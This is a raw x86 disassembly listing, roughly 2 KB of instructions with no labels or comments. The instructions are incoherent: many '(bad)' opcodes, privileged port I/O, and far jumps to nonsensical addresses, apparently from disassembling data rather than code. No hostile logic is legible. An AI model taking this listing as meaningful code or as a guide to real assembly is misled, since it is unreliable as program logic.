  425cdf:	push   0x5e9b424c
  425ce4:	cdq    
  425ce5:	test   DWORD PTR [ebx-0x34],ecx
  425ce8:	push   edi
  425ce9:	adc    DWORD PTR [ebx],edi
  425ceb:	sub    bl,BYTE PTR [eax-0x77]
  425cee:	call   0xfe0708cb
  425cf3:	lahf   
  425cf4:	je     0x425d11
  425cf6:	jle    0x425d2c
  425cf8:	jmp    0x7b3260e1
  425cfd:	fadd   QWORD PTR [ebp+ebx*8-0x37]
  425d01:	and    DWORD PTR [esi-0x2e],eax
  425d04:	adc    edi,edi
  425d06:	les    esp,FWORD PTR [ecx-0x35bf6e5]
  425d0c:	cmp    BYTE PTR [ebp+0x43d593e3],al
  425d12:	ret    0x8a7c
  425d15:	jl     0x425d56
  425d17:	mov    cl,0x4
  425d19:	mov    ecx,0xef8d445a
  425d1e:	push   esp
  425d1f:	mov    ebx,0x6f7f8ffd
  425d24:	mov    dh,0xc6
  425d26:	out    dx,al
  425d27:	in     eax,0xad
  425d29:	jmp    0x26cb38e
  425d2e:	leave  
  425d2f:	xchg   edi,esp
  425d31:	mov    eax,0xe7a0fe65
  425d36:	scas   eax,DWORD PTR es:[edi]
  425d37:	test   DWORD PTR ds:0xe025a081,eax
  425d3d:	cmc    
  425d3e:	or     esi,0xca470b78
  425d44:	rcr    DWORD PTR [edi-0x5],0xda
  425d48:	repz sbb BYTE PTR [ebx+0x6d],dl
  425d4c:	jl     0x425dcb
  425d4e:	mov    ds:0x6e35626e,eax
  425d53:	test   DWORD PTR ds:0x42d25e2e,esp
  425d59:	push   0xcc0e8838
  425d5e:	and    ah,0x46
  425d61:	adc    al,0x17
  425d63:	sub    al,0xb9
  425d65:	fcmove st,st(0)
  425d67:	fwait
  425d68:	push   esi
  425d69:	push   esi
  425d6a:	fcomp  QWORD PTR [edi+0x31f53ac0]
  425d70:	ja     0x425ddb
  425d72:	sub    al,0x98
  425d74:	sbb    DWORD PTR [ebp+0x19],esp
  425d77:	dec    esi
  425d78:	dec    esi
  425d79:	cmp    ch,0x56
  425d7c:	mov    ebx,?
  425d7e:	xchg   edx,eax
  425d7f:	loope  0x425d3b
  425d81:	sub    ebx,DWORD PTR ds:0x6eb294a0
  425d87:	xchg   ecx,eax
  425d88:	cmp    bl,ch
  425d8a:	iret   
  425d8b:	add    bh,BYTE PTR [edx-0x469c2ce4]
  425d91:	out    0xff,al
  425d93:	dec    ebp
  425d94:	jg     0x425d46
  425d96:	js     0x425d64
  425d98:	push   edi
  425d99:	in     eax,0xf5
  425d9b:	jmp    0x425db8
  425d9d:	(bad)  
  425d9e:	das    
  425d9f:	mov    al,bh
  425da1:	imul   BYTE PTR [edi]
  425da3:	adc    al,0x81
  425da5:	adc    eax,0xc8cbd229
  425daa:	push   ds
  425dab:	dec    edx
  425dac:	pop    eax
  425dad:	cwde   
  425dae:	(bad)  
  425daf:	cmc    
  425db0:	inc    edx
  425db1:	sbb    ebp,esp
  425db3:	fisubr WORD PTR [eax]
  425db5:	pusha  
  425db6:	stos   BYTE PTR es:[edi],al
  425db7:	cmp    esp,DWORD PTR [ebx-0xa]
  425dba:	loop   0x425de6
  425dbc:	sbb    BYTE PTR [edx-0x21631f26],bl
  425dc2:	nop
  425dc3:	test   al,0xfa
  425dc5:	mov    edi,DWORD PTR [ebp+esi*4-0x45]
  425dc9:	or     al,0x32
  425dcb:	xchg   ebp,eax
  425dcc:	fst    QWORD PTR [ebp+0x7054b4f7]
  425dd2:	mov    ebp,0x52d8fcd8
  425dd7:	add    BYTE PTR [eax+0x4dc97bf7],dh
  425ddd:	gs stos DWORD PTR es:[edi],eax
  425ddf:	and    eax,0xcfc9bd5b
  425de4:	stc    
  425de5:	jae    0x425db2
  425de7:	mov    eax,0x3fbc5384
  425dec:	std    
  425ded:	dec    eax
  425dee:	call   0x7c5d:0xf3c5439e
  425df5:	sub    DWORD PTR [ebp-0x383b07bc],esi
  425dfb:	fucomi st,st(0)
  425dfd:	aad    0xb7
  425dff:	cmp    ch,ch
  425e01:	dec    ebp
  425e02:	cmp    al,0xd8
  425e04:	mov    ds:0x46ba5905,al
  425e09:	push   edi
  425e0a:	push   ecx
  425e0b:	or     DWORD PTR [edi-0x4a],ebp
  425e0e:	sub    DWORD PTR [ecx+0x284e98ad],ebx
  425e14:	and    esp,DWORD PTR [eax]
  425e16:	fst    DWORD PTR [edx-0x51dea361]
  425e1c:	test   DWORD PTR [eax+0x673d8a7f],ebp
  425e22:	jmp    0x1fbc:0x75ab2e25
  425e29:	das    
  425e2a:	js     0x425e5e
  425e2c:	mov    BYTE PTR [edx-0x49],dl
  425e2f:	iret   
  425e30:	and    bh,dl
  425e32:	add    BYTE PTR ss:[ebx],0x54
  425e36:	xchg   esi,eax
  425e37:	dec    esi
  425e38:	ds scas eax,DWORD PTR es:[edi]
  425e3a:	add    eax,0x26b2c410
  425e3f:	adc    eax,ebp
  425e41:	call   0x2eb74ccf
  425e46:	xchg   ebx,eax
  425e47:	fld    QWORD PTR [eax]
  425e49:	add    BYTE PTR [edx+0x44],al
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0x3
  425e57:	cli    
  425e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e59:	jmp    0x686:0x1ec36
  425e60:	add    BYTE PTR [eax],al
  425e62:	(bad)  
  425e63:	sar    DWORD PTR [edx-0x5a32090],cl
  425e69:	jbe    0x425ee9
  425e6b:	mov    ds:0xc0e7b58e,eax
  425e70:	jb     0x425e6c
  425e72:	sbb    BYTE PTR [edx-0x39],bl
  425e75:	stos   DWORD PTR es:[edi],eax
  425e76:	stos   BYTE PTR es:[edi],al
  425e77:	or     ch,bl
  425e79:	sub    al,0xc4
  425e7b:	stos   BYTE PTR es:[edi],al
  425e7c:	adc    ebp,edx
  425e7e:	add    al,0xf9
  425e80:	push   0x64b9cdcc
  425e85:	xchg   ebx,eax
  425e86:	and    BYTE PTR [esi-0x5fc57ec0],bl
  425e8c:	pop    esp
  425e8d:	pop    ebp
  425e8e:	lods   eax,DWORD PTR ds:[esi]
  425e8f:	add    BYTE PTR [ecx+0x20],ah
  425e92:	fucomi st,st(7)
  425e94:	loop   0x425eea
  425e96:	mov    cl,BYTE PTR [edi]
  425e98:	push   ebx
  425e99:	and    ah,BYTE PTR [edx+ebp*4+0x16681cb7]
  425ea0:	pop    ss
  425ea1:	xlat   BYTE PTR ds:[ebx]
  425ea2:	xchg   edi,eax
  425ea3:	mov    bh,0xc6
  425ea5:	fs or  al,0x7d
  425ea8:	inc    esi
  425ea9:	ds push ss
  425eab:	scas   eax,DWORD PTR es:[edi]
  425eac:	pusha  
  425ead:	mov    esi,0xeeedb1df
  425eb2:	data16 adc bh,BYTE PTR [edi-0x73]
  425eb6:	inc    eax
  425eb7:	retf   0x3333
  425eba:	adc    eax,edx
  425ebc:	xor    BYTE PTR [edi+0x5b],0x2
  425ec0:	push   ebx
  425ec1:	mov    ds:0x1f657478,eax
  425ec6:	out    dx,al
  425ec7:	push   esp
  425ec8:	mov    ds:0x5bda3dcf,al
  425ecd:	mov    al,BYTE PTR [edi-0x78]
  425ed0:	lods   eax,DWORD PTR ds:[esi]
  425ed1:	adc    dh,ch
  425ed3:	ds scas eax,DWORD PTR es:[edi]
  425ed5:	push   0x4e35a0b6
  425eda:	pop    edx
  425edb:	repnz imul edx,DWORD PTR [eax+0x2d],0xafcff07b
  425ee3:	dec    ecx
  425ee4:	push   edx
  425ee5:	in     al,0x64
  425ee7:	scas   eax,DWORD PTR es:[edi]
  425ee8:	sar    DWORD PTR [edi],cl
  425eea:	pop    DWORD PTR [esi-0x48]
  425eed:	(bad)  
  425eee:	mov    ebp,0x5cfc0704
  425ef3:	mov    ebp,0x4e4175c9
  425ef8:	clc    
  425ef9:	jg     0x425e8f
  425efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425efc:	xlat   BYTE PTR ds:[ebx]
  425efd:	repz in al,0x1b
  425f00:	push   ecx
  425f01:	pushf  
  425f02:	cmp    ah,bl
  425f04:	dec    esi
  425f05:	push   ecx
  425f06:	mov    ecx,0xa93e72a4
  425f0b:	repz sub al,0xbc
  425f0e:	addr16 mov ch,0xac
  425f11:	xchg   edi,eax
  425f12:	mov    ds:0x87737a56,al
  425f17:	add    al,0x1e
  425f19:	ins    DWORD PTR es:[edi],dx
  425f1a:	scas   al,BYTE PTR es:[edi]
  425f1b:	mov    gs,WORD PTR [ebx-0x42dee6ad]
  425f21:	fimul  DWORD PTR [edi+0xa]
  425f24:	pusha  
  425f25:	out    0xa1,al
  425f27:	jg     0x425f5d
  425f29:	xor    esp,0xe5429fc8
  425f2f:	mov    esi,0xfdcaee0d
  425f34:	add    al,0x70
  425f36:	xor    ah,BYTE PTR [ecx-0x1]
  425f39:	sbb    BYTE PTR [eax],dh
  425f3b:	int3   
  425f3c:	push   es
  425f3d:	fisttp QWORD PTR [ebp-0x70d83968]
  425f43:	pop    eax
  425f44:	arpl   WORD PTR ss:[esi-0x1a],di
  425f48:	inc    esi
  425f49:	scas   eax,DWORD PTR es:[edi]
  425f4a:	(bad)  
  425f4c:	into   
  425f4d:	sub    WORD PTR [edx-0x17],di
  425f51:	pop    eax
  425f52:	xchg   edi,eax
  425f53:	cwde   
  425f54:	ror    BYTE PTR [ecx-0x48],cl
  425f57:	push   ds
  425f58:	pop    ds
  425f59:	pop    ss
  425f5a:	imul   edi,DWORD PTR cs:[edi-0xb32b7d9],0xaab72ab8
  425f65:	add    eax,0x5fd468e8
  425f6a:	mov    edx,0x1d664ad0
  425f6f:	or     eax,0x35b26b7a
  425f74:	mov    esi,0x286d23e1
  425f79:	test   al,0x4e
  425f7b:	test   BYTE PTR [ecx-0x5810c368],al
  425f81:	inc    ebp
  425f82:	jae    0x425f1c
  425f84:	(bad)  
  425f85:	jno    0x425f89
  425f87:	add    BYTE PTR [esi+0x1f41deee],al
  425f8d:	imul   DWORD PTR ds:0xc4ea4438
  425f93:	sub    DWORD PTR [ebx],ebp
  425f95:	daa    
  425f96:	scas   al,BYTE PTR es:[edi]
  425f97:	outs   dx,DWORD PTR ds:[esi]
  425f98:	or     ebx,DWORD PTR [edx+0x34]
  425f9b:	js     0x425faa
  425f9d:	mov    eax,0x555167f6
  425fa2:	scas   al,BYTE PTR es:[edi]
  425fa3:	push   cs
  425fa4:	inc    esp
  425fa5:	popa   
  425fa6:	xor    ebx,DWORD PTR [edx-0x42f67907]
  425fac:	outs   dx,BYTE PTR ds:[esi]
  425fad:	xchg   esp,eax
  425fae:	ss sub ecx,esi
  425fb1:	addr16 mov dl,0x7f
  425fb4:	idiv   bh
  425fb6:	es stos DWORD PTR es:[edi],eax
  425fb8:	shr    BYTE PTR [eax-0x48],0x8
  425fbc:	push   0xffffff98
  425fbe:	inc    ebx
  425fbf:	es fcmovnbe st,st(2)
  425fc2:	in     al,0xa3
  425fc4:	or     al,0xca
  425fc6:	jmp    DWORD PTR [eax-0x5be3f5ea]
  425fcc:	retf   0x8642
  425fcf:	mov    BYTE PTR [esp+eax*4+0x6a],ah
  425fd3:	xchg   BYTE PTR [esi],al
  425fd5:	out    dx,eax
  425fd6:	push   cs
  425fd7:	or     cl,0xce
  425fda:	sbb    eax,0xf8c07e7c
  425fdf:	cmp    DWORD PTR [ebx-0x2c],ecx
  425fe2:	loopne 0x425fbb
  425fe4:	jge    0x425fd0
  425fe6:	mov    WORD PTR [edi+0x3f],cs
  425fe9:	adc    al,0x21
  425feb:	retf   0xfbcd
  425fee:	scas   al,BYTE PTR es:[edi]
  425fef:	push   ebx
  425ff0:	enter  0xc846,0x5a
  425ff4:	popf   
  425ff5:	vpcmpeqd xmm4,xmm2,xmm4
  425ff9:	bnd jbe 0x42604e
  425ffc:	mov    bl,ch
  425ffe:	in     eax,0xd8
  426000:	inc    ebp
  426001:	jne    0x426046
  426003:	push   0xb6adccd9
  426008:	xchg   edx,eax
  426009:	daa    
  42600a:	rcl    edx,cl
  42600c:	iret   
  42600d:	scas   eax,DWORD PTR es:[edi]
  42600e:	adc    DWORD PTR [edi],eax
  426010:	adc    bh,BYTE PTR [edi-0x4e]
  426013:	jmp    0x382f:0xee38db94
  42601a:	xchg   ebp,esp
  42601c:	xor    cl,BYTE PTR [esp+0x5e]
  426020:	xchg   DWORD PTR [ebp+0x785b1a83],eax
  426026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426027:	aaa    
  426028:	jns    0x426099
  42602a:	in     eax,0x2a
  42602c:	xchg   esi,eax
  42602d:	mov    ebx,0x7f3ae8af
  426032:	pop    eax
  426033:	aad    0xa5
  426035:	out    dx,eax
  426036:	mov    dh,0x15
  426038:	jnp    0x425fe3
  42603a:	and    DWORD PTR [ecx-0x14],edi
  42603d:	hlt    
  42603e:	aad    0xf5
  426040:	mov    eax,0x2fcc4f78
  426045:	adc    eax,0xc4b7680c
  42604a:	add    DWORD PTR [eax],ebx
  42604c:	icebp  
  42604d:	les    eax,FWORD PTR [ebx+esi*1-0x5c]
  426051:	leave  
  426052:	sar    DWORD PTR [eax-0x1f],1
  426055:	cmp    BYTE PTR [ecx-0x39339705],ah
  42605b:	mov    WORD PTR [eax+0x8],gs
  42605e:	mov    bh,0xf0
  426060:	test   DWORD PTR [edx+0x21df7150],edx
  426066:	mov    dl,0x81
  426068:	sub    al,bl
  42606a:	mov    esp,0x1ea9e4ae
  42606f:	mov    dl,0xaa
  426071:	outs   dx,BYTE PTR ds:[esi]
  426072:	es cld 
  426074:	dec    ecx
  426075:	push   ebp
  426076:	test   BYTE PTR [ebp+0x7098d6b4],dl
  42607c:	dec    edx
  42607d:	out    dx,al
  42607e:	(bad)  
  42607f:	shl    bl,0x55
  426082:	jle    0x426008
  426084:	out    dx,eax
  426085:	jae    0x426102
  426087:	mov    dl,0x85
  426089:	push   0xffffff96
  42608b:	xor    BYTE PTR [esi+0xa],bh
  42608e:	into   
  42608f:	mov    ch,0xd4
  426091:	and    DWORD PTR [edx],0xffffffc0
  426094:	mov    ah,BYTE PTR [edi]
  426096:	retf   0x1abc
  426099:	and    edx,eax
  42609b:	and    eax,0x33812019
  4260a0:	pop    esp
  4260a1:	retf   
  4260a2:	mov    dl,0x42
  4260a4:	test   al,0x15
  4260a6:	in     al,dx
  4260a7:	sub    al,0x64
  4260a9:	sbb    ebp,edx
  4260ab:	cmp    al,0x93
  4260ad:	(bad)  
  4260ae:	push   esp
  4260af:	dec    esi
  4260b0:	jp     0x4260ca
  4260b2:	jmp    0x4260b5
  4260b4:	xor    eax,0x8da0df49
  4260b9:	xor    esi,DWORD PTR [eax]
  4260bb:	mov    dh,0x97
  4260bd:	xchg   cl,ah
  4260bf:	inc    esi
  4260c0:	sbb    BYTE PTR [edx+0x13],ch
  4260c3:	stos   DWORD PTR es:[edi],eax
  4260c4:	push   esi
  4260c5:	dec    ecx
  4260c6:	in     eax,0xf8
  4260c8:	lods   eax,DWORD PTR ds:[esi]
  4260c9:	and    al,0xc2
  4260cb:	stos   DWORD PTR es:[edi],eax
  4260cc:	inc    edx
  4260cd:	int3   
  4260ce:	hlt    
  4260cf:	aaa    
  4260d0:	ffreep st(3)
  4260d2:	ret    0xabc2
  4260d5:	xor    bh,BYTE PTR [ebp+0x3662d98c]
  4260db:	ins    BYTE PTR es:[edi],dx
  4260dc:	jmp    0x924d5e1
  4260e1:	pop    ds
  4260e2:	inc    esi
  4260e3:	leave  
  4260e4:	mov    ebx,0x40ee4d82
  4260e9:	shl    bh,0x17
  4260ec:	mov    BYTE PTR [esp+ebx*4+0xc],ch
  4260f0:	jbe    0x4260e4
  4260f2:	ret    0xb911
  4260f5:	mov    ebp,0x8785e579
  4260fa:	lock ja 0x42610e
  4260fd:	cmp    edx,DWORD PTR [ebx]
  4260ff:	hlt    
  426100:	xor    esp,esi
  426102:	pop    ebx
  426103:	sar    ebp,1
  426105:	adc    BYTE PTR [esi-0x43],bh
  426108:	daa    
  426109:	(bad)  
  42610a:	lods   eax,DWORD PTR ds:[esi]
  42610b:	and    al,0x28
  42610d:	cdq    
  42610e:	xchg   BYTE PTR [ebp-0xd18b80],ah
  426114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426115:	scas   al,BYTE PTR es:[edi]
  426116:	cmp    ebp,DWORD PTR [esi-0x3f5d78e1]
  42611c:	mov    ch,0x9
  42611e:	jg     0x426103
  426120:	(bad)  
  426121:	and    eax,edx
  426123:	inc    edx
  426124:	je     0x426145
  426126:	push   esi
  426127:	aad    0xd3
  426129:	xlat   BYTE PTR ds:[ebx]
  42612a:	sti    
  42612b:	rcl    eax,1
  42612d:	fidiv  WORD PTR [edx+ecx*1+0x1884daa2]
  426134:	sbb    cl,BYTE PTR [esi-0x42]
  426137:	in     eax,0xce
  426139:	mov    al,0x13
  42613b:	add    BYTE PTR [edx],bh
  42613d:	dec    ebp
  42613e:	in     al,dx
  42613f:	sti    
  426140:	add    DWORD PTR [ebx-0x3cddd8cb],ecx
  426146:	xchg   esi,eax
  426147:	dec    ebp
  426148:	hlt    
  426149:	int    0x72
  42614b:	stos   BYTE PTR es:[edi],al
  42614c:	cmc    
  42614d:	stos   DWORD PTR es:[edi],eax
  42614e:	mov    ds:0x3002d8fe,eax
  426153:	clc    
  426154:	push   ss
  426155:	rol    bh,1
  426157:	in     al,dx
  426158:	mov    ebp,0xcb8bd4fc
  42615d:	add    edx,esi
  42615f:	outs   dx,BYTE PTR ds:[esi]
  426160:	jmp    0xad56:0x41fd4e4b
  426167:	mov    eax,ds:0x7b8ea7ef
  42616c:	mov    ch,bh
  42616e:	enter  0xa43a,0xba
  426172:	in     eax,dx
  426173:	ja     0x426178
  426175:	clc    
  426176:	adc    DWORD PTR [edi+0x15],0x796f2567
  42617d:	mov    bh,BYTE PTR [edx+0x4a]
  426180:	add    DWORD PTR [esi-0x403902c2],eax
  426186:	call   0x2f64:0xbecd68e9
  42618d:	mov    ah,0x79
  42618f:	(bad)
  426192:	ds out dx,eax
  426194:	aaa    
  426195:	adc    al,0xe
  426197:	pop    esi
  426198:	cmp    al,0x67
  42619a:	inc    edi
  42619b:	test   BYTE PTR [eax],0xd8
  42619e:	mov    bh,0x9
  4261a0:	mov    al,ds:0x91878c8d
  4261a5:	mov    ebp,0x842260fc
  4261aa:	outs   dx,BYTE PTR ds:[esi]
  4261ab:	call   0x20d0:0xf4f82ee3
  4261b2:	in     eax,0x99
  4261b4:	lods   eax,DWORD PTR ds:[esi]
  4261b5:	stc    
  4261b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261b7:	adc    eax,0xc74d4fa3
  4261bc:	outs   dx,DWORD PTR ds:[esi]
  4261bd:	adc    eax,0x6a63de8d
  4261c2:	fdivr  QWORD PTR [ebp+0x168c828f]
  4261c8:	aam    0xcc
  4261ca:	xor    eax,0x1003313d
  4261cf:	fdivr  QWORD PTR [edx-0x34]
  4261d2:	bound  esp,QWORD PTR [esi]
  4261d4:	sub    al,0x7a
  4261d6:	fisttp WORD PTR gs:[ecx-0x2d]
  4261da:	imul   ecx,DWORD PTR [eax],0x828c5e0b
  4261e0:	mov    DWORD PTR [ebp+0x2d],eax
  4261e3:	or     eax,0xa67c00ae
  4261e8:	lea    ebp,[ebx]
  4261ea:	loopne 0x426215
  4261ec:	mov    gs,WORD PTR [ecx-0x6a]
  4261ef:	push   0x58
  4261f1:	xor    eax,0x30752789
  4261f6:	(bad)  [edx-0x3c0010d9]
  4261fc:	sub    ebp,ebx
  4261fe:	shl    DWORD PTR [esi-0x22],cl
  426201:	inc    ebp
  426202:	pop    edi
  426203:	jle    0x4261ff
  426205:	ds cmp al,0xc2
  426208:	pusha  
  426209:	jmp    0x4261a9
  42620b:	adc    eax,0xadc99354
  426210:	aad    0xcb
  426212:	cmp    al,BYTE PTR [ebx+0x7b]
  426215:	lock imul ebp,edi,0xfe04eb0a
  42621c:	shr    DWORD PTR [edi],1
  42621e:	xchg   ecx,eax
  42621f:	cs shr bh,0xaf
  426223:	shl    DWORD PTR [ebx+0x5274ad13],1
  426229:	mov    esi,edi
  42622b:	jecxz  0x426299
  42622d:	jecxz  0x426249
  42622f:	and    BYTE PTR [edx-0x47],ch
  426232:	into   
  426233:	jmp    FWORD PTR [ebp+0x1a]
  426236:	sar    cl,0x97
  426239:	sub    DWORD PTR [edi-0x3f],esi
  42623c:	bound  ebp,QWORD PTR [edx+0x4b1a78b7]
  426242:	add    eax,0xf59fb3e5
  426247:	xor    ah,BYTE PTR [esi+0x4d]
  42624a:	cld    
  42624b:	rcl    DWORD PTR [ecx+0x33],0x3e
  42624f:	mov    bh,0x3
  426251:	out    0x3f,eax
  426253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426254:	push   es
  426255:	xchg   ebp,eax
  426256:	jmp    0xf50:0x90e57163
  42625d:	xchg   edx,eax
  42625e:	sahf   
  42625f:	dec    ebx
  426260:	(bad)  
  426261:	(bad)  
  426262:	out    dx,al
  426263:	fidiv  DWORD PTR [esi-0x4]
  426266:	add    ebp,ebx
  426268:	dec    esp
  426269:	sar    edi,0x62
  42626c:	sti    
  42626d:	mov    edx,0xbcff346d
  426272:	cld    
  426273:	jne    0x426296
  426275:	adc    ebp,DWORD PTR [edx-0x3712a9a4]
  42627b:	mov    dh,0x72
  42627d:	inc    edx
  42627e:	add    DWORD PTR [edi],eax
  426280:	mov    al,0xa4
  426282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426283:	rcl    BYTE PTR [eax+edx*4],cl
  426286:	call   0xd6ae9d35
  42628b:	sahf   
  42628c:	sbb    al,0x1f
  42628e:	mov    bl,0x12
  426290:	mov    dl,0x9
  426292:	aas    
  426293:	gs stc 
  426295:	jo     0x426279
  426297:	scas   eax,DWORD PTR es:[edi]
  426298:	js     0x4262fe
  42629a:	add    eax,0x26d08c3d
  42629f:	pushf  
  4262a0:	pop    edi
  4262a1:	mov    esi,0xf280c151
  4262a6:	inc    eax
  4262a7:	xor    al,0xcf
  4262a9:	lods   eax,DWORD PTR ds:[esi]
  4262aa:	js     0x426314
  4262ac:	shl    BYTE PTR [eax-0x77],1
  4262af:	out    dx,eax
  4262b0:	jns    0x426325
  4262b2:	nop
  4262b3:	inc    esi
  4262b4:	dec    edx
  4262b5:	popa   
  4262b6:	clc    
  4262b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262b8:	dec    ebx
  4262b9:	lea    eax,[ecx]
  4262bb:	xchg   esi,eax
  4262bc:	add    edi,DWORD PTR ds:0xdcd38b97
  4262c2:	data16 out 0xc9,al
  4262c5:	in     al,dx
  4262c6:	mov    eax,0x54d59612
  4262cb:	aaa    
  4262cc:	fwait
  4262cd:	sub    DWORD PTR [eax+0x1d],eax
  4262d0:	mov    bh,0xe7
  4262d2:	mov    ebx,0xe16e80c1
  4262d7:	xchg   edi,eax
  4262d8:	fisub  DWORD PTR [eax+0x1]
  4262db:	mov    dl,0x3b
  4262dd:	sub    al,0x6c
  4262df:	das    
  4262e0:	(bad)  
  4262e1:	stos   DWORD PTR es:[edi],eax
  4262e2:	dec    eax
  4262e3:	pop    ecx
  4262e4:	popa   
  4262e5:	and    cl,cl
  4262e7:	pop    DWORD PTR [ebp-0x4c5a3c1e]
  4262ed:	mov    ah,0x8d
  4262ef:	clc    
  4262f0:	fcomp  QWORD PTR [ecx]
  4262f2:	std    
  4262f3:	add    DWORD PTR [edi],0xe3f391c9
  4262f9:	ins    DWORD PTR es:[edi],dx
  4262fa:	dec    eax
  4262fb:	outs   dx,DWORD PTR ds:[esi]
  4262fc:	inc    ebp
  4262fd:	es sub al,0xbb
  426300:	jg     0x426343
  426302:	gs push esp
  426304:	enter  0x9e12,0xe
  426308:	push   0x7cb41865
  42630d:	jo     0x4262bf
  42630f:	push   edx
  426310:	xchg   ebp,eax
  426311:	and    al,0xe2
  426313:	leave  
  426314:	retf   
  426315:	mov    edi,0x379c9dcd
  42631a:	mov    ah,0x9c
  42631c:	js     0x426390
  42631e:	xchg   ebp,eax
  42631f:	add    al,0x4e
  426321:	sub    BYTE PTR ds:0x6389de94,al
  426327:	pop    es
  426328:	fisub  WORD PTR [ebx]
  42632a:	outs   dx,BYTE PTR ds:[esi]
  42632b:	cmp    eax,0x415cda9
  426330:	or     esi,edi
  426332:	mov    ch,0x54
  426334:	xlat   BYTE PTR ds:[ebx]
  426335:	sbb    DWORD PTR [ebp+0x12b5575d],eax
  42633b:	dec    ecx
  42633c:	dec    DWORD PTR [edi+ecx*2+0x72]
  426340:	adc    eax,0xbe1a2024
  426345:	mov    dl,0xfa
  426347:	addr16 call 0x1eb1:0xabf168e8
  42634f:	sub    edi,DWORD PTR [ebx-0x7c]
  426352:	mov    ds:0xc79c953e,eax
  426357:	add    bl,BYTE PTR [edi+0x11]
  42635a:	inc    ecx
  42635b:	mov    DWORD PTR [ebp-0x64fa4cf4],edx
  426361:	jo     0x426302
  426363:	pop    es
  426364:	xor    edi,edi
  426366:	inc    edi
  426367:	pop    es
  426368:	jmp    0x426309
  42636a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42636b:	add    eax,0x9ab6ea93
  426370:	retf   
  426371:	jecxz  0x42634f
  426373:	jg     0x4263f0
  426375:	mov    es,WORD PTR [ebx+eiz*2]
  426378:	sbb    ecx,esp
  42637a:	dec    ebp
  42637b:	dec    eax
  42637c:	jbe    0x426353
  42637e:	and    al,BYTE PTR ds:0xfcd50985
  426384:	outs   dx,BYTE PTR ds:[esi]
  426385:	pop    ebx
  426386:	sti    
  426387:	clc    
  426388:	pop    edi
  426389:	jg     0x4263fb
  42638b:	adc    BYTE PTR [ebx+ebp*8-0x4f],dh
  42638f:	dec    ecx
  426390:	cwde   
  426391:	ins    DWORD PTR es:[edi],dx
  426392:	jae    0x42635c
  426394:	mov    edx,0x44f13964
  426399:	aad    0x6d
  42639b:	xlat   BYTE PTR ds:[ebx]
  42639c:	mov    cl,0xd6
  42639e:	mov    esp,0xccc8761
  4263a3:	jl     0x426416
  4263a5:	mov    ecx,0x3ec0036b
  4263aa:	cs jmp 0xdf14:0x7e0c21a4
  4263b2:	popa   
  4263b3:	dec    esi
  4263b4:	(bad)  
  4263b5:	int3   
  4263b6:	and    eax,0x66ac62fb
  4263bb:	xor    bh,BYTE PTR [ebx-0x52]
  4263be:	push   0x3
  4263c0:	jecxz  0x42642d
  4263c2:	xchg   esp,eax
  4263c3:	push   esp
  4263c4:	js     0x426352
  4263c6:	mov    ds:0x345263b0,al
  4263cb:	add    ebp,DWORD PTR [ebp+0x66724a21]
  4263d1:	mov    al,ds:0xf406ca
  4263d6:	scas   eax,DWORD PTR es:[edi]
  4263d7:	push   edx
  4263d8:	sbb    eax,0x9ccb7f1d
  4263dd:	cmc    
  4263de:	cmp    bh,BYTE PTR [ebp-0x7f]
  4263e1:	jle    0x42643d
  4263e3:	ins    BYTE PTR es:[edi],dx
  4263e4:	mov    bl,0x2b
  4263e6:	dec    edi
  4263e7:	xor    eax,DWORD PTR [eax-0x55fb8c]
  4263ed:	lods   eax,DWORD PTR ds:[esi]
  4263ee:	ins    DWORD PTR es:[edi],dx
  4263ef:	cdq    
  4263f0:	pop    ebp
  4263f1:	adc    DWORD PTR ds:0x3e3321c5,edx
  4263f7:	jo     0x42644e
  4263f9:	outs   dx,DWORD PTR ds:[esi]
  4263fa:	imul   esi,DWORD PTR [eax],0xa9901fda
  426400:	xlat   BYTE PTR ds:[ebx]
  426401:	pop    ebp
  426402:	pop    esi
  426403:	inc    eax
  426404:	in     al,0xbb
  426406:	iret   
  426407:	pop    ecx
  426408:	es ins DWORD PTR es:[edi],dx
  42640a:	jmp    FWORD PTR [edx+0x15958806]
  426410:	sbb    ecx,edx
  426412:	dec    esi
  426413:	sbb    al,0x86
  426415:	fild   QWORD PTR [edx+0x22a58f9d]
  42641b:	mov    dl,0xf7
  42641d:	mov    al,BYTE PTR [esi-0x27]
  426420:	pop    esi
  426421:	imul   ecx,DWORD PTR [edx-0x7576e685],0x1d
  426428:	imul   DWORD PTR [ecx]
  42642a:	xchg   ebp,eax
  42642b:	sub    DWORD PTR [eax],0xfffffff7
  42642e:	xchg   DWORD PTR [esi+0x38],edx
  426431:	retf   0x43df
  426434:	out    0xcf,eax
  426436:	pop    esi
  426438:	pusha  
  426439:	cmp    ch,bh
  42643b:	pop    es
  42643c:	xchg   ecx,eax
  42643d:	rol    BYTE PTR [ebp-0x6a],0x9e
  426441:	cmp    eax,0x2a915f6c
  426446:	mov    WORD PTR [ecx],es
  426448:	lds    ebp,FWORD PTR [eax+0x70]
  42644b:	mov    DWORD PTR [esi+esi*4+0x55d74bd9],eax
  426452:	fs mov ch,0x9
  426455:	aam    0x8d
  426457:	push   edi
  426458:	les    edx,FWORD PTR [esi-0x1]
  42645b:	xlat   BYTE PTR ds:[ebx]
  42645c:	inc    edx
  42645d:	and    eax,0x4597e677
  426462:	jle    0x42643c
  426464:	stos   DWORD PTR es:[edi],eax
  426465:	bound  ebp,QWORD PTR [edx+0x61833856]
  42646b:	mov    cl,0x60
  42646d:	cdq    
  42646e:	and    ebp,eax
  426470:	inc    esi
  426471:	js     0x42640e
  426473:	out    0x4b,al
  426475:	add    eax,0x96964837
  42647a:	shl    ch,0xf6
  42647d:	jb     0x4264a3
  42647f:	out    dx,eax
  426480:	xor    bh,dl
  426482:	ja     0x4264b9
  426484:	xor    DWORD PTR [ecx],0x6c3d754b
  42648a:	sar    esi,0x7d
  42648d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
